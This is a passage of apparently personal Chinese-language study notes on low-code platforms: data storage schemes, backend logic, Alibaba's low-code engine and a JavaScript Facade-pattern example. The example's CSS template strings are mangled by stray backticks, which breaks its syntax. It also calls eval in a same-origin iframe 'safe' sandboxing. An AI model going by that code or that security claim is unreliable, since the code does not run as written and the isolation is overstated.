在国内发展缓慢，接受度依然很低，**目前还没听说有哪家大公司里最重要的数据存在 MongoDB 里**，一方面有历史原因，另一方面不少数据库都开始支持 JSON 字段，已经能取代大部分必须用 MongoDB 的场景了。\n- 不支持高级 SQL 查询\n\n它的**最大特点**是界面编辑和数据存储是统一的，当你拖入文本框到页面后就会自动创建对应的字段，**不需要先创建数据模型再创建界面**，因此用起来更简单\n\n现在 MySQL、Postgres 等数据库都支持 JSON 字段类型了，是否可以用这个字段来实现低代码？\n- 答案是不太行，因为\n\t- ==只适合数据量不大的场景==\n\t- 不能创建索引：\n\t\t- 虽然 JSON 字段可以用来存用户自定义数据，但无法创建字段索引，比如在 MySQL 要想给 JSON 创建索引\n\n### 10.3. 方案 3： 使用行代替列\n\n这是很多可扩展平台里使用的技术，比较典型的是 `WordPress`，它的扩展性很强，装个扩展就能变成电商网站\n\n```sql\nCREATE TABLE wp_postmeta (\n  meta_id bigint(20) unsigned NOT NULL auto_increment,\n  post_id bigint(20) unsigned NOT NULL default '0',\n  meta_key varchar(255) default NULL,\n  meta_value longtext,\n  PRIMARY KEY  (meta_id),\n  KEY post_id (post_id),\n  KEY meta_key (meta_key)\n) DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;\n```\n\n其中的关键就是 `meta_key` 和 `meta_value` 这两个字段，相当于将数据库当 KV 存储用了，因此可以任意扩展字段名及值。\n\n这个方案主要用于成熟项目的扩展，比如在 CRM 产品中允许用户扩展字段，但因为**性能较低**，并不适合通用低代码平台。\n\n### 10.4. 方案 4：元信息+宽表\n\n早期数据库不支持 JSON 字段的时候，有些开发者会预留几个列来给用户扩展自定义属性，比如在表里加上 ext1、ext2、ext3 字段，让用户可以存 3 个定制数据，基于这个原理我们可以进一步扩展，通过预留大量列来实现应用自定义存储。\n\n实现它有两个关键点：**元数据、预留列**，这里简单说明一下原理，首先系统预先创建一个 500 列的表，比如就叫 data：\n\n|tenant_id|table_id|uuid|value0|value1|...|value 4000|\n|---|---|---|---|---|---|---|\n|||||||\n\n要完全实现这个方案还有很多细节问题得解决，不展开了\n\n这个方案比前面几个方案的优点是：\n- 比起第一种原生数据库表方案，它不需要 DDL 操作，不容易出问题，跟适合 SaaS 产品。\n- 比起第二种文档型数据库方案，它的存储使用更为成熟的关系型数据库，相关的运维工具多。\n- 比起第三种行代替列方案，它的查询性能好，因为是读取一行数据。\n\n缺点也比较多\n- 数据泄露风险高，因为所有租户的数据都存在一张表里，而数据库都不支持行级别权限的账号\n- **整体实现成本高**，其中很多细节需要处理好，比如保证数据一致性，因为为了实现唯一性、索引等功能需要拷贝数据，更新的时候要同时更新。\n\n我认为这个方案虽然很适合 **SaaS 类的低代码产品** ，==但国内的 SaaS 环境，还是放弃吧==\n\n### 10.5. 方案 5：使用单文件\n\n这个方案目前只在「仿 Excel」的零代码平台中见过，它和 Excel 类似，数据全都放一个文件里，查询过滤完全靠前端，优点是：\n\n- 实现简单，部署成本低，因为表的存储就是单文件。\n- 容错性强，数据类型都是靠前端处理的，不会出现存数据库导致。\n\n缺点是：\n- 如果要支持行列级别权限校验，还得在后端实现一遍过滤，而每次都加载一个巨大的 JSON 文件对服务器内存有较高要求。\n- 难以支持事务操作，尤其是支持行级别的操作。\n- 目前看**十万级别数据处理可以只靠前端，但再大量的数据就不合适了**，一次性加载太多对带宽和浏览器内存要求比较高。\n- 只能当成 Excel 的替代品，数据是孤岛，不能直连外部数据库\n\n## 11. 后端低代码的方案：如何实现后端业务逻辑\n\n大概有这几种方案：\n- 逻辑图形化，这个目前看各个产品效果都不太理想，看上去还不如代码易读\n\t- 前面提过代码难以图形化，这在后端也是一样的\n- **固定行为**，主要是对数据存储提供`增删改查`操作\n- ==支持 JavaScript 自定义==\n- 简化 DSL 语言\n\t- 类似 Excel 中的公式\n- ==执行树==\n\n### 11.1. 后端支持使用 JavaScript\n\n主要原因是 JavaScript 引擎容易被嵌入，而且启动速度快，了解的人多，比如市值超过 1200 亿美元的 `ServiceNow 后端`自定义业务逻辑就是基于 `Rhino 引擎`实现的。\n\n### 11.2. 简化 DSL 语言，类似 Excel 中的公式\n\n`简化 DSL 语言`的主要是使用场景是做`表达式计算` ，\n\n其实用公式会比 JavaScript 会更简单，因为系统可以自动转换数据类型，并自动处理异步函数的调用\n\n### 11.3. 执行树\n\n![图片&文件](./files/20241105-27.png)\n\n左侧是树形结构，右侧是点中某个节点时的参数配置，左侧的树形结构其实是直接参考代码的树形结构：\n- 默认从上往下执行，但有个特殊的「并行执行」节点可以并行执行。\n- 对于循环和分支会创建子节点，并且子节点可以无限嵌套，相当于代码里的花括号。\n- 节点可以折叠，这样就能先将复杂的逻辑折叠起来方便看主流程，这是使用图模式难以实现的，在图里收起后无法修改其它节点的位置，导致空出一块。\n\n为了方便实现简单逻辑处理，我们还增加了 `JavaScript 节点`和 `SQL 节点`。\n\n> 但执行树这个方案目前的定位是**聚合多接口**，将多个后端接口数据合并后给前端\n\n## 12. 后端低代码的方案：如何实现流程流转？\n\n![图片&文件](./files/20241105-28.png)\n\n`BPMN` 不能解决平台锁定问题，在一个平台开发的流程无法直接迁移到另一个平台。\n\n虽然目前业界有开源的流程引擎，但这些引擎大多是`面向代码开发`，不太好改造成`平台模式`，因此在爱速搭里自己实现了流程引擎，这样才能更好定制功能。\n\n## 13. 低代码的未来\n\n- 低代码唯一不可缺少的功能是`可视化编辑`，这是低代码的`最大优势`，\n- 但低代码的**最大缺陷**，是**可视化难以表达复杂的抽象逻辑**\n- 因此长远看低代码并不会在所有领域取代专业开发，更多是**和专业开发配合来提升效率**。\n\n从技术方案上看低代码平台主要有两个方向：\n\n- **偏向零代码**的方案，它的特点是\n\t- 易用性强\n\t- 灵活性差\n\t- 适合小公司，==客单价低，但客户数多==\n\t- 标准化程度高，导致功能都很类似，将面临同质化竞争\n\t- 产品使用简单，客户支持成本低\n- **偏向专业开发**的方案，它的特点是\n\t- 易用性弱\n\t- 灵活性强\n\t- 适合中大型公司，客户数少，但客单价高\n\t- 标准化程度低，每家都有各自的特点\n\t- 产品使用复杂，客户支持成本高\n\n零代码产品有好几种形态，和去年一样，我更看好「**在线 Excel**」，因为既然是面向非开发者，类 Excel 是上手成本最低的方案，而且这一年来许多「在线 Excel」的产品**都加上了低代码功能**\n- 比如 Airtable 的 [Interface](https://link.zhihu.com/?target=https%3A//blog.airtable.com/interfacebuilder/)，在功能上和表单驱动的零代码越来越接近了。\n- 又比如 **飞书的多维表格** \n","h0cXNUg9":"\n# 好文：阿里低代码引擎和生态建设实战及思考\n\n`#lowcode` \n\n> 参考: [阿里低代码引擎和生态建设实战及思考](https://mp.weixin.qq.com/s/MI6MrUKKydtnSdO4xq6jwA)\n\n\n## 目录\n<!-- toc -->\n ## 1. 一个梗 \n\n![图片&文件](./files/20241130-11.png)\n\n> 这就是为什么咨询公司喜欢低代码了，降本增效嘛\n\n## 2. 低代码体系的架构设计思考\n\n### 2.1. 为什么我们需要低代码？\n\n![图片&文件](./files/20241130-13.png)\n\n**通过可视化界面来配置完成传统的应用程序开发 & 交付过程**\n- 让办公室行政人员、营销人员等**非技术人员**轻松完成「研发」工作\n- 让**开发人员**更快地研发。\n\n低代码的**核心价值是**\n- 「降本提效」\n- 「角色赋能」\n\n### 2.2. 现状：烟囱架构 → 各个平台的共性？\n\n![图片&文件](./files/20241130-14.png)\n\n现状就是：\n- 不同的技术栈\n- 不同的业务场景\n\t- toB、toC、企业智能、数据类产品等等\n\n> 注意上图的颜色\n\n### 2.3. 如何找到平台的共同点？以及支撑平台差异点？ \n\n![图片&文件](./files/20241130-15.png)\n\n### 2.4. 分层架构：协议 → 引擎 → 生态 → 平台\n\n![图片&文件](./files/20241130-16.png)\n\n- 底层协议栈：\n\t- 定义的是标准，**标准的统一让上层产物的互通成为可能**\n- 引擎\n\t- 是**对协议的实现**，同时通过能力的输出，向上支撑生态开放体系，提供各种生态扩展能力\n- 生态\n\t- 是基于引擎核心能力上扩展出来的，比如 物料、设置器、插件等，还有工具链支撑开发体系\n- 低代码平台\n\t- 各个平台基于引擎内核以及生态中的**产品组合**、衔接形成满足其需求的低代码平台。\n\n- 每一层都明确自身的定位，各司其职\n\t- 协议不会去思考引擎如何实现\n\t- 引擎也不会实现具体上层平台功能\n\t- 上层平台的定制化均通过==插件==来实现\n\n下面分开展开这四层：\n\n## 3. 底层：协议栈\n\n![图片&文件](./files/20241130-17.png)\n\n- 术语：\n\t- 我们沟通的基础，概念相通，方便高效沟通\n- 结构：\n\t- 包括**页面或者应用**描述的结构，如何定义**页面组件树、数据源、生命周期、页面状态**等\n- 行为\n\t- 不同的业务场景，我们对物料的配置、约束、扩展各不相同\n\t- 所以我们在物料描述中有各种各样的钩子来支持自定制\n\n> 更多可参考《阿里巴巴中后台前端搭建协议规范》和《阿里巴巴中后台前端物料规范》\n\n## 4. 低代码引擎\n\n![图片&文件](./files/20241130-18.png)\n\n代码引擎分为 4 大模块，入料、编排、渲染、出码，下面展开聊聊\n\n### 4.1. 入料模块：\n\n- 就是将外部的物料导入\n\t- 比如海量的 npm 组件，按照《物料描述协议》进行描述，将描述后的数据通过引擎 API 注册后，在编辑器中使用\n- 注意，**这里仅是增加描述，而非重写一套**\n\t- 这样我们能最大程度==复用 ProCode 体系已沉淀的组件==。\n\n### 4.2. 编排模块\n\n本质上来讲，就是\n- **不断在生成符合《搭建协议》的页面描述，将编辑器中的所有物料，进行布局设置、组件 CRUD 操作、以及 JS/CSS编写/逻辑编排**\n\t- ==→== 最终转换成页面描述\n\n#### 4.2.1. 工作台&编辑器骨架\n\n首先我们得有一个**工作台**，我们叫**编辑器骨架**（如下图）分为\n- 几个**默认可视的区域**\n\t- 一些可以展开的区域\n\t- 可以弹窗显示的区域\n\t- 中心区域\n\t\t- 是编排和渲染的画布\n\n![图片&文件](./files/20241130-19.png)\n\n#### 4.2.2. 协议是**文本协议**，是一个 json 结构\n\n==编排的本质==：\n- 不断生成符合《搭建**协议**》的页面描述的过程\n- 然后通过**渲染器**将页面描述渲染成真正的视图\n\t- 这些的协议是文本协议，是个 JSON ，**手写也是可以的** ，类似于 amis \n\t- 渲染器：\n\t\t- 将 JSON 渲染真正视图\n\n![图片&文件](./files/20241130-20.png)\n\n#### 4.2.3. 节点和模型属性（低代码的 DOM 结构）\n\n- 协议是文本协议，是一个 json 结构，理论上手写也能完成\n- 但是考虑到可编程性我们设计了一套**节点和属性模型**，**类似于 DOM**，\n\t- 项目模型 → 页面模型 → 节点模型 → 属性模型\n- ==这样操作节点 + 配置属性就等价于在操作页面描述，也就是操作 json 结构了==。\n\n![图片&文件](./files/20241130-21.png)\n\n> [!success]\n> 所以，我想表达的是，**低代码的实现原理，浏览器已经做过一遍了**\n\n#### 4.2.4. 除了 Node 和 Attr，DOM 还有啥？\n\n- 除了**节点模型和属性模型**之外，上层还有**文档&项目模型**\n\t- 对于物料的管理，有物料注册机制和**物料模型**\n\t\t- **类似于 DOM 的：Node 节点、Attr节点、Document 节点 等**\n- 另外我们提供了通用的面板管理、拖拽引擎、resize引擎，设计器辅助层、原地编辑、快捷键等二十几个模块（如下图）\n\t- 而这所有的模块的能力，也就是 API，都通过**插件**进行调用，于是**插件成为了扩展编辑器的唯一载体**\n\t\t- 你可以定制你的面板\n\t\t- 可以操作节点树\n\t\t- 可以定制节点的扩展操作\n\t\t- 可以去操作物料模型\n\t\t- 可以去绑定快捷键\n\t\t- 可以设定画布大小\n\t\t- 可以定制拖拽行为\n\n![图片&文件](./files/20241130-22.png)\n\n### 4.3. 渲染模块\n\n- 渲染：\n\t- 即将编排生成的页面描述结构渲染成视图的过程\n- 视图：是面向用户的，所以必须处理好\n\t- **内部数据流、生命周期、事件绑定、国际化**等。\n\n### 4.4. 出码模块：DSL Schema 协议 → 编译 → 源码\n\n- **将页面描述结构解析和转换成应用代码的机制**\n\n\n![图片&文件](./files/20241130-23.png)\n\n- 常规业务场景，直接由渲染模块渲染即可，也就是 ==Amis 做到的那一层==\n- 但是考虑到一些特殊情况\n\t- **不支持动态化**的场景：==小程序==\n\t- 为了更好的性能：\n\t\t- 转码成 `ProCode` 打包部署\n\t- 需要==二次开发场景==\n- 因此，我们设计了出码框架\n\t- 出码框架提供一套流水线式的处理流程\n\t- 类似 babel 的机制，通过一个个的`出码插件` / `preset` 来定制你的出码产物\n\t- 市面上的 react 框架、vue 框架、小程序框架都可以支持\n\n> [!success]\n>  个人理解：**本质是对 DSL 协议的编译过程，将 DSL 协议 → → Token → AST → JS AST → 源码 的过程**\n\n## 5. 引擎生态\n\n![图片&文件](./files/20241130-24.png)\n\n\n- **最小内核最强生态**是我们的设计原则\n\t- 因此如何定义什么是内核能力，什么是生态以及如何支撑生态，是我们整个体系设计的重中之重\n- 经过我们支撑众多平台的经验，我们发现平台的差异性体现在这 3 点：**物料、设置器和插件**\n\t- **插件**是扩展的入口，包括**物料和设置器**也是通过插件才能注册到引擎\n\t\t- 我们定义了引擎的约束，这是唯一不可变的部分，以及引擎 API 的能力，包括面板、画布、物料管理、拖拽等所有能力，**都可以通过插件来使用**。\n\t\t- 同时，插件我们设计成高内聚、显性化配置、可流通的形态，这支撑了插件生态的形成，甚至更高层面，让自定义设计器也可以通过可视化配置实现。  \n- 多说一嘴，因为生态体系如此重要，我们在生态元素**调试能力**上也下了一番功夫\n\t- 目前我们通过工具链 + 调试插件让一切生态元素均可调试，可相互组合调试，可线上调试。\n\n### 5.1. 插件、设置器、物料\n\n![图片&文件](./files/20241130-25.png)\n\n我们具象化一点来看引擎生态，这是一个标准的中后台设计器页面，如上图：\n- 插件：\n\t- **蓝色**部分是**插件**，这些都是能被看到的**插件**，因为调用的是面板 API\n\t\t- ==某个组件的设计态本质也是一个插件，注册到低代码平台中的==\n\t- 还有一些不能被看到，比如调用了快捷键 API，拖拽 API、事件 API 等。\n- 设置器：\n\t- **红色**部分就是**设置器**了，可以定制我们==如何给一个节点的属性赋值==。\n- 物料：\n\t- **橙色**部分就是物料了，其实**物料本质上是一个模型**\n\t- 也是不可见的，不过这里通过物料面板调用了物料 API 来显性化展示了物料，再通过拖拽 API 和 节点 API 来拖拽并插入到画布中。\n\n### 5.2. 设计器 = 引擎 + 选择物料 + 选择设置器 + 选择插件\n\n- 丰富的生态，让快速、低成本打造低代码平台成为可能\n- 我们有物料生态、设置器生态、插件生态\n- 因此，我们推导出一个简单的公式：\n\t- **低代码的设计器等价于引擎 + 选择物料 + 选择设置器 + 选择插件**。\n\n![图片&文件](./files/20241130-26.png)\n\n### 5.3. 协议来支持多技术栈\n\n- 不管是《阿里巴巴中后台前端搭建协议规范》，还是《阿里巴巴中后台前端物料规范》，都是**与语言无关的**。\n- 定义一套物料描述，而具体实现可以是 react / vue 或者任何技术栈\n\t- vue Renderer\n\t- React Renderer\n\t- ==Flutter Renderer，理论是也是可以的==\n\t- 小程序等等\n- 对于搭建页面（设计态）\n\t- 你可以在设计态用 react 组件，渲染时也用 react 组件\n\t- 但注意，因为设计和渲染的中间产物页面描述也是语言无关的，所以渲染时可以是任意语言\n\t\t- 可以是 react，可以是 vue，当然也可以是小程序。\n\t- **理论是可以的：当然混搭的场景不是我臆想的哈，阿里内部有不少混搭的实践。**\n\n![图片&文件](./files/20241130-27.png)\n\n### 5.4. 模拟器实现\n\n**编排和渲染的双层架构设计，通过这个架构，我们实现了绝对纯净的编辑态渲染，即模拟器实现**。\n\n![图片&文件](./files/20241130-28.png)\n\n编辑器中内嵌一个所见即所得的**渲染模块**，但这会有一个问题，**css 污染的问题**\n- 因为编辑器中各个模块，物料、设置器、插件都**来自不同的团队**，很容易产生 css 污染。\n- 编辑器中的元素互相污染问题都不算太大，但是污染了渲染视图就很严重了，==大家可以思考下为什么？==\n\n我们的解法是**将模拟器放入到一个新的 iframe 中运行**\n- 通过编辑器将相关资源注入到模拟器，建立数据通道，使用 facade 模式\n- 即在**编辑器和模拟器**中各有一个 `facade  对象`来负责对外的方法暴露和调用，避免深度耦合。\n\n> 设计模式：外观模式，下文详细再介绍下\n> 另外一种解法是：直接 iframe 嵌入就好了，或者更进一步，使用微前端的方案，这类隔离思路挺多\n\n\n> 可参考：[8. 微前端原理（篇二：无界）](/post/3SBP1pr3.html)\n\n#### 5.4.1. 附： Facade（外观）模式\n\n- Facade 模式是一种结构型设计模式，它为复杂的子系统提供一个简单的统一接口。\n- 这个模式的名字 \"Facade\"（外观）来自建筑学，就像建筑物的正面外观一样，它为背后复杂的结构提供了一个统一的外表。\n\n JavaScript 实现一个使用外观模式来处理低代码平台中编辑器和模拟器的样式和变量冲突问题的示例。\n\n```javascript\n// 子系统：样式隔离管理器\nclass StyleIsolationManager {\n    constructor() {\n        this.styleMap = new Map();\n    }\n\n    // 为特定组件创建样式作用域\n    createScope(componentId, styles) {\n        const scopedClassName = `scope-${componentId}`;\n        const scopedStyles = this._scopeStyles(styles, scopedClassName);\n        this.styleMap.set(componentId, {\n            className: scopedClassName,\n            styles: scopedStyles\n        });\n        return scopedClassName;\n    }\n\n    // 将样式转换为作用域样式\n    _scopeStyles(styles, scopeName) {\n        return styles.replace(/([^{]+){/g, (match) => {\n            return `.${scopeName} ${match}`;\n        });\n    }\n\n    // 应用样式到文档\n    applyStyles(componentId) {\n        const styleData = this.styleMap.get(componentId);\n        if (!styleData) return;\n\n        const styleElement = document.createElement('style');\n        styleElement.textContent = styleData.styles;\n        document.head.appendChild(styleElement);\n        return styleElement;\n    }\n}\n\n// 子系统：变量作用域管理器\nclass VariableScopeManager {\n    constructor() {\n        this.scopes = new Map();\n    }\n\n    // 创建变量作用域\n    createScope(scopeId) {\n        if (!this.scopes.has(scopeId)) {\n            this.scopes.set(scopeId, new Map());\n        }\n        return scopeId;\n    }\n\n    // 在作用域中设置变量\n    setVariable(scopeId, key, value) {\n        const scope = this.scopes.get(scopeId);\n        if (scope) {\n            scope.set(key, value);\n        }\n    }\n\n    // 从作用域中获取变量\n    getVariable(scopeId, key) {\n        const scope = this.scopes.get(scopeId);\n        return scope ? scope.get(key) : undefined;\n    }\n}\n\n// 子系统：沙箱环境管理器\nclass SandboxManager {\n    constructor() {\n        this.sandboxes = new Map();\n    }\n\n    // 创建沙箱环境\n    createSandbox(sandboxId) {\n        const iframe = document.createElement('iframe');\n        iframe.style.display = 'none';\n        document.body.appendChild(iframe);\n        \n        const sandboxContext = iframe.contentWindow;\n        this.sandboxes.set(sandboxId, sandboxContext);\n        \n        return sandboxContext;\n    }\n\n    // 在沙箱中执行代码\n    executeInSandbox(sandboxId, code) {\n        const sandbox = this.sandboxes.get(sandboxId);\n        if (sandbox) {\n            try {\n                return sandbox.eval(code);\n            } catch (error) {\n                console.error('Sandbox execution error:', error);\n                throw error;\n            }\n        }\n    }\n}\n\n// Facade：低代码平台环境管理器\nclass LowCodeEnvironmentFacade {\n    constructor() {\n        this.styleManager = new StyleIsolationManager();\n        this.variableManager = new VariableScopeManager();\n        this.sandboxManager = new SandboxManager();\n    }\n\n    // 初始化编辑器环境\n    initializeEditor(editorId) {\n        const editorScope = this.styleManager.createScope(editorId, `\n            .editor-content { \n                background: `#fff;`\n                padding: 20px;\n            }\n            .editor-toolbar {\n                border-bottom: 1px solid `#eee;`\n            }\n        `);\n\n        this.variableManager.createScope(`editor-${editorId}`);\n        this.sandboxManager.createSandbox(`editor-${editorId}`);\n\n        return {\n            scopeClassName: editorScope,\n            setVariable: (key, value) => {\n                this.variableManager.setVariable(`editor-${editorId}`, key, value);\n            },\n            getVariable: (key) => {\n                return this.variableManager.getVariable(`editor-${editorId}`, key);\n            }\n        };\n    }\n\n    // 初始化模拟器环境\n    initializeSimulator(simulatorId) {\n        const simulatorScope = this.styleManager.createScope(simulatorId, `\n            .simulator-container {\n                border: 1px solid `#ddd;`\n                margin: 10px;\n            }\n            .simulator-content {\n                min-height: 400px;\n            }\n        `);\n\n        this.variableManager.createScope(`simulator-${simulatorId}`);\n        const sandbox = this.sandboxManager.createSandbox(`simulator-${simulatorId}`);\n\n        return {\n            scopeClassName: simulatorScope,\n            setVariable: (key, value) => {\n                this.variableManager.setVariable(`simulator-${simulatorId}`, key, value);\n            },\n            getVariable: (key) => {\n                return this.variableManager.getVariable(`simulator-${simulatorId}`, key);\n            },\n            executeCode: (code) => {\n                return this.sandboxManager.executeInSandbox(`simulator-${simulatorId}`, code);\n            }\n        };\n    }\n\n    // 同步编辑器和模拟器的状态\n    syncEnvironments(editorId, simulatorId) {\n        const editorVars = Array.from(\n            this.variableManager.scopes.get(`editor-${editorId}`).entries()\n        );\n        \n        editorVars.forEach(([key, value]) => {\n            this.variableManager.setVariable(`simulator-${simulatorId}`, key, value);\n        });\n    }\n}\n\n\n```\n\n##### 5.4.1.1. 使用\n\n```javascript hl:6,9\n// 使用示例\nfunction example() {\n    // 创建低代码平台环境管理器\n    const lowCodeEnv = new LowCodeEnvironmentFacade();\n\n    // 初始化编辑器\n    const editor = lowCodeEnv.initializeEditor('editor1');\n    \n    // 初始化模拟器\n    const simulator = lowCodeEnv.initializeSimulator('simulator1');\n\n    // 在编辑器中使用\n    const editorContainer = document.createElement('div');\n    editorContainer.className = editor.scopeClassName;\n    editor.setVariable('theme', 'light');\n    editor.setVariable('components', [{\n        type: 'button',\n        props: { text: 'Click me' }\n    }]);\n\n    // 在模拟器中使用\n    const simulatorContainer = document.createElement('div');\n    simulatorContainer.className = simulator.scopeClassName;\n    \n    // 同步编辑器和模拟器的状态\n    lowCodeEnv.syncEnvironments('editor1', 'simulator1');\n    \n    // 在模拟器中执行代码\n    simulator.executeCode(`\n        const theme = '${simulator.getVariable('theme')}';\n        const components = ${JSON.stringify(simulator.getVariable('components'))};\n        console.log('Theme:', theme);\n        console.log('Components:', components);\n    `);\n}\n\n// 测试代码\nexample();\n```\n\n##### 5.4.1.2. 其他说明\n\n- 样式隔离\n\t- 使用 `StyleIsolationManager` 为编辑器和模拟器创建独立的样式作用域\n\t- 通过自动添加作用域前缀来避免样式冲突\n\t- 支持动态创建和管理样式\n- 变量作用域管理\n\t- 使用 `VariableScopeManager` 为不同环境维护独立的变量作用域\n\t- 防止编辑器和模拟器之间的变量污染\n\t- 提供变量的存取接口\n- 沙箱环境\n\t- 使用 `SandboxManager` 创建独立的执行环境\n\t- 通过 iframe 实现代码隔离\n\t- 安全地执行模拟器中的代码\n- 统一的接口\n\t- `LowCodeEnvironmentFacade` 提供了简单统一的接口\n\t- 隐藏了底层实现的复杂性\n\t- 提供了环境同步等高级功能\n\n## 6. 低代码平台\n\n![图片&文件](./files/20241130-29.png)\n\n低代码引擎通过**协议先行，最小内核，最强生态**的理念，形成了 4 大模块以及生态扩展性的整体设计，在灵活性上足以支撑各种类型低代码平台。\n\n但这引擎 + 生态的组合似乎还是**偏底层**，离一个**真正生产可用的低代码平台**有点距离。比如\n1. 搭建出来的页面描述保存到哪里去 ？\n2. 搭建完成后，**产物打包系统**哪家强 ？\n3. 页面**多人编辑冲突**如何解决 ？\n4. **研发流程**如何定义 ？\n5. **版本管理**，多分支咋搞 ？\n6. 页面区块 / 低代码组件怎么搭建 ？怎么使用 ？\n\n### 6.1. UIPaaS\n\n![图片&文件](./files/20241130-30.png)\n\n\n所以，我们在引擎之上再加上一层，形成一个**低代码平台的基座**，或者叫孵化器。\n- 我们把这个低代码平台的孵化器叫做 UIPaaS\n\t- 在阿里内部，我们更多是基于 UIPaaS 来开始打造低代码平台，这样会更轻松一点。  \n- 为什么要做 UIPaaS ？两点原因：\n\t- 解决产品能力的问题\n\t\t- 实现了==应用管理、研发流程、打包流程、发布流程==等一系列能力\n\t- 解决快速在找到**符合需求的生态元素组合**\n\n![图片&文件](./files/20241130-31.png)\n\n- 设计器：\n\t- 提供一个**开箱即用的标准版页面设计器**，\n\t\t- 开箱即用意味着整合了一批插件，**插件都已经跟后端服务**相绑定了；\n\t- 提供简单版、进阶版设计器定制方案。\n- 运行时：\n\t- 提供稳定的，功能丰富的**运行时 SDK**，包括页面描述的获取、路由、layout，甚至还有一套**运行时中间件机制**\n- 生态：\n\t- 提供「**生态中心**」\n\t\t- 大量组件、插件、解决方案唾手可得\n\t- 提供「**一站式研发平台**」\n\t\t- 可开发、调试低代码领域的所有物料\n- 管理后台：\n\t- 提供功能完善、方便定制的**管理后台模板应用**，\n\t\t- 包括研发流程、应用依赖管理、打包配置、路由配置等\n- 后端服务：\n\t- 官方提供 140+ 网关接口，覆盖设计器、运行时、管理后台等全流程；\n\t- 允许上==层平台注册服务到 UIPaaS==，供其他平台使用。\n\n>  批注：其他系统的 API 可以注册到平台上，在该平台做编排，这也是做 API 管理平台的意义所在\n\n- 我们**有各种业务场景，各种用户角色，各种技术栈**，因此产生形形色色的低代码平台几乎是个必然结果。\n- 唯一的问题是如何低成本、快速地支撑各个平台的开发，在阿里，我们通过 **UIPaaS 孵化器**来支撑。\n\n![图片&文件](./files/20241130-32.png)\n\n目前我们打造的**垂直类平台**\n- 有耳熟能详的中后台，有运营场景，数据报表类场景\n- 还有以设计类为代表的角色协同、产物互通的平台\n- 还有移动应用、IoT、aPaaS 等类型\n\n### 6.2. 中后台平台\n\n![图片&文件](./files/20241130-33.png)\n\n功能包含**页面大纲树、组件面板、源码面板、国际化、模型编排等核心能力，以及打包系统、研发管理**等模块\n\n### 6.3. 数据报表类的平台\n\n会对**图表库、数据模块、账号权限体系、设置器**等做深度定制，如下图：\n\n![图片&文件](./files/20241130-34.png)\n\n> 更多平台，如何集成数据团队的前端来该平台上贡献组件，开发插件等\n\n### 6.4. 小程序编排平台\n\n核心是接入一套小程序的组件，定制一些**小程序特有的配置**，以及对接各个**发布渠道**。\n\n![图片&文件](./files/20241130-35.png)\n\n## 7. 最后\n\n![图片&文件](./files/20241130-36.png)\n\n\n虽然提到了很多低代码平台，似乎让使用低代码开发成为了一种风潮。但是我建议不要盲目跟风\n- **低代码研发也只是一种研发范式，跟以往任何一种研发范式相比，没有孰高孰低**。\n- 适合的，才是最好的，评估标准只有两点：**是否能研发提效？以及是否能角色赋能？**","CpPwjMao":"\n# 好文：低代码探索之路\n\n`#lowcode` \n\n> 参考: [2B 领域下的低代码探索之路](https://mp.weixin.qq.com/s/HAxrMHLT43dPH488RiEIdw)\n\n\n## 目录\n<!-- toc -->\n ## 1. 定义 \n\n通过`模型/建模`、图形界面拖放组件可以加快应用开发，达到**降本增效**的目的\n\n- 通过**建模**和**图形界面**来==可视化应用程序开发==\n\t- 开发人员可以跳过手工编码\n\t- 从而**加快**了将应用程序投入生产的过程\n- 低代码开发是一种**可视化应用开发方法**\n\t- 使用**拖放式组件**和**模型驱动**逻辑来创建 Web 和移动应用\n\n## 2. 前端从业人员认为的低代码鼻祖\n\n![图片&文件](./files/20241130-7.png)\n\n## 3. 当下低代码应该是\n\n![图片&文件](./files/20241130-8.png)\n\n## 4. 低代码市场分类：表单驱动 + 模型驱动\n\n- 一种是基于**表单驱动**\n\t- 核心能力是**表单、流程、报表**\n\t- 在一定的场景下，可以快速的做业务交付，上手成本也比较低。\n\t\t- 比如：宜搭、简道云、明道云、氚云等\n- 另一种是基于**模型驱动** \n\t- 核心是==领域模型、业务沉淀、完整性==\n\t- 有一定的技术壁垒，上手成本相对比较高\n\t\t- 比如：Outsystems / Mendix / PowerApps / 奥哲云枢 / 金蝶云苍穹等\n\n## 5. 更高格局：云 + 端 + 协同 + 低代码 → 微软\n\n![图片&文件](./files/20241130-9.png)\n\n所以，低代码平台只是其中的一部分而已\n\n## 6. 探索过程：\n\n> 1. **始于表单终于表单**；2.**从技术到产品。**\n\n### 6.1. 中后台搭建\n\n- 给前端用，技术同学是来写代码的，就排斥**这种高不成低不就的搭建平台产品**，而且功能又不全，被骂的很惨。\n- 给后端用，当然排斥，**让我一个写 Java 的做前端的页面？**\n\n>  之前贝壳的时候，强推服务端使用\n\n> 个人相信，给时间持续迭代，多点耐心，**能满足大部分企业内部中后台搭建场景**\n\n### 6.2. 服务化\n\n服务化就是我可以让其他团队也快速拥有低代码搭建的能力，并且可以做定制\n\n### 6.3. 代码互转/WebIDE\n\n需求逐渐变得复杂时，发现搭建满足不了，然后我们开始**做出码**，将搭建产物转成代码，在 WebIDE 或者 IDE 上继续开发\n\n## 7. 再之后：价值？商业化？\n\n### 7.1. 灵魂三问\n\n1. 如何能把价值再做大？\n2. 低代码 or 零代码？\n3. 用户是谁？\n\n### 7.2. 再问\n\n- 能否商业化呢？\n- 要不要商业化呢？\n- 如何商业化？\n\n### 7.3. 竞品中找答案？\n\n- Salesforce / Power Platform / 金蝶云苍穹\n\t- 他们的 PaaS 都是有**明确支撑的业务领域**，CRM / ERP。\n\t- ==PaaS 是基于自身的 SaaS 长出来的==\n- 工具类的竞品，像 Outsystems/ Mendix\n\t- 他们提供是**软件工具、方法和架构**，可以快速建模、测试、部署、管理等\n\t- ==是一套完整应用开发的闭环（测试、部署、调试、稳定性等）==\n\t- 单纯做工具, 最后被收购？像 Mendix \n\t- ==蛋糕还有吗？==\n\t\t- 要考虑多租、二开等，技术复杂度极高\n- 国内，看背景出身\n\t- 简道云，背后是帆软-数据出身，氚云-流程出身。两个产品都偏零代码，产品体验做的都很不错\n\n## 8. 冰山理论\n\n![图片&文件](./files/20241130-10.png)\n\n### 8.1. 拖拽设计器 == 低代码？\n\n远远不是，看冰山下面的东西，更高的高山（微软）\n\n## 9. 现实是什么？\n\n### 9.1. 场景需求与业务壁垒\n\n- ==场景需求驱动==：疫情下，各种扫码，登记\n- 能科做低代码平台\n\t- 工业软件实施背景\n\n### 9.2. 平台锁定完整性\n\n**平台锁定**要求用户==在一个平台上能把所有研发相关的事情全部做完==。所以要求\n- 可维护性\n- 可控的开发质量\n- 维护性和升级成本\n- 二次需求开发\n\n### 9.3. 工业软件开发生态建设\n\n- 实施后能够**沉淀**下来什么？\n- 